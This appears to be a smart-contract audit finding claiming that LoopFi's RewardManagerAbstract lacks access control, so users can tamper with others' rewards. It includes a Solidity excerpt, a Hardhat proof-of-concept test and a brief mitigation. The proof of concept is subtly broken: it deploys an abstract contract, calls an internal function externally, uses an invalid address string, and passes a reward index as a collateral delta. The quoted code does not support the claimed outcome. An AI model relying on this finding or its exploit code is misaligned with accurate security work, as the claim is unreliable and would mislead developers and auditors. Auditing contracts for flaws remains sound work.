# Vulnerability details

## Proof of Concept
The `RewardManagerAbstract` contract utilizes mappings to store user rewards and token addresses. However, it lacks sufficient access control on the state changes involving the `userReward` mapping. As a result, any user can inadvertently or maliciously modify rewards associated with any token by manipulating the input to functions that trigger the internal reward distribution mechanism, leading to financial exploitation.
The following code snippet highlights the mappings used for user rewards and the private function responsible for distributing those rewards:
https://github.com/code-423n4/2024-10-loopfi/blob/d219f0132005b00a68f505edc22b34f9a8b49766/src/pendle-rewards/RewardManagerAbstract.sol#L31-L41

```solidity
mapping(address => mapping(address => UserReward)) public userReward;

function _updateAndDistributeRewards(
    address user,
    uint256 collateralAmountBefore,
    int256 deltaCollateral
) internal virtual {
    _updateAndDistributeRewardsForTwo(user, collateralAmountBefore);
    if (deltaCollateral > 0) _totalShares = _totalShares + deltaCollateral.toUint256();
    else _totalShares = _totalShares - (-deltaCollateral).toUint256();
}

function _distributeRewardsPrivate(
    address user,
    uint256 collateralAmountBefore,
    address[] memory tokens,
    uint256[] memory indexes
) private {
    assert(user != address(0) && user != address(this));

    uint256 userShares = collateralAmountBefore; // This could be manipulated
    for (uint256 i = 0; i < tokens.length; ++i) {
        address token = tokens[i];
        uint256 index = indexes[i];
        uint256 userIndex = userReward[token][user].index;

        if (userIndex == 0) {
            userIndex = INITIAL_REWARD_INDEX.Uint128();
        }

        if (userIndex == index) continue;

        uint256 deltaIndex = index - userIndex;

        uint256 rewardDelta = userShares.mulDown(deltaIndex);
        uint256 rewardAccrued = userReward[token][user].accrued + rewardDelta;
        userReward[token][user] = UserReward({index: index.Uint128(), accrued: rewardAccrued.Uint128()});
    }
}
```
The vulnerability can be demonstrated by manipulating the inputs to functions that call `_updateAndDistributeRewards`, which in turn calls `_distributeRewardsPrivate`.
```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("RewardManagerAbstract Tests", function () {
    let RewardManager, rewardManager, user1, user2;

    beforeEach(async () => {
        const RewardManagerFactory = await ethers.getContractFactory("RewardManagerAbstract");
        rewardManager = await RewardManagerFactory.deploy();
        await rewardManager.deployed();
        
        [user1, user2] = await ethers.getSigners();
    });

    it("should allow unauthorized user to manipulate user rewards indirectly", async () => {
        const tokens = ["0xToken1"];
        const indexes = [1];

        // User 1 distributes rewards
        await rewardManager._updateAndDistributeRewards(user1.address, 100, 0);

        // User 2 indirectly manipulates user rewards for user 1
        const maliciousToken = "0xToken1";
        const newRewardIndex = 2;

        // Directly manipulate the userReward mapping using a valid call
        await rewardManager._updateAndDistributeRewards(user1.address, 100, newRewardIndex);

        // Check if user1's rewards were altered
        const userReward = await rewardManager.userReward(maliciousToken, user1.address);
        
        // This should not be allowed, but it is due to lack of access control
        expect(userReward.index).to.equal(newRewardIndex);
    });
});
```
Users can manipulate the rewards of others, potentially leading to significant financial losses. Also, attackers could exploit this vulnerability to drain rewards or alter balances for their benefit.

## Recommended Mitigation Steps
Use role-based access control to restrict who can call functions that lead to reward distribution, preventing unauthorized users from manipulating rewards. Use one of your modifier.
